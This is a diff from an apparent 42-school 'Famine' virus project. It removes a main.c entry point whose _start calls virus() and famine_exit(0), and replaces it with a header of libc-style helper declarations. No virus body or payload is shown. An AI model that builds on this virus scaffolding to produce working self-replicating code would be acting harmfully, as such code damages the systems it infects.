@@ -1,21 +1,25 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   main.c                                             :+:      :+:    :+:   */
+/*   utils.h                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 07:23:16 by agrumbac         ###   ########.fr       */
+/*   Created: 2019/06/06 03:51:06 by agrumbac          #+#    #+#             */
+/*   Updated: 2019/06/07 04:07:00 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "famine.h"
-#include "syscall.h"
+#ifndef UTILS_H
+# define UTILS_H
 
-int	_start(void)
-{
-	virus();
-	famine_exit(0);
-	__builtin_unreachable();
-}
+ssize_t		ft_getrandom(void *buf, size_t buflen);
+void		ft_bzero(void *ptr, size_t size);
+void		*ft_memcpy(void *dst, void *src, size_t n);
+int		ft_memcmp(const void *s1, const void *s2, size_t n);
+char		*ft_strcat(char *s1, char *s2);
+char		*ft_strcpy(char *dst, const char *src);
+size_t		ft_strlen(const char *s);
+int		dprintf(int fd, char *fmt, ...);
+
+#endif
